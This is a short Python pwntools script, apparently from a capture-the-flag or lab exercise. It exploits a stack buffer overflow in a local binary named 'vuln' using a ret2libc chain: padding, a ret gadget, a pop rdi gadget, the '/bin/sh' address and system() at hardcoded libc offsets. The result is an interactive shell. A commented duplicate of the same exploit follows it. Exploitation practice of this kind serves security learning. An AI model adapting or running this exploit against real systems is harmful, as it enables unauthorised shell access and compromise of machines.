from pwn import *
#p = process('./vuln')
p = gdb.debug('./vuln','b main')
junk = b'A'*216
libc_base = 0x00007ffff7dc4000
system_offset = 0x52290
system = p64(libc_base + system_offset)
binsh = p64(libc_base + 0x1b45bd)
gadget = p64(libc_base + 0x23b6a)
empty_ret = p64(libc_base + 0x22679)
payload = junk + empty_ret + gadget + binsh + system 
p.sendline(payload)
p.interactive()


"""
from pwn import *
#p = process('./vuln')
p = gdb.debug('./vuln','b main')
buf = b"A"*216
libc_base = 0x00007ffff7dc4000
system_offset = p64(libc_base + 0x52290)
bin_sh_offset = p64(libc_base + 0x1b45bd)
pop_rdi = p64(libc_base + 0x23b6a)
empty_ret = p64(libc_base + 0x22679)
p.sendline(buf + empty_ret + pop_rdi + bin_sh_offset + system_offset)
p.interactive()
"""
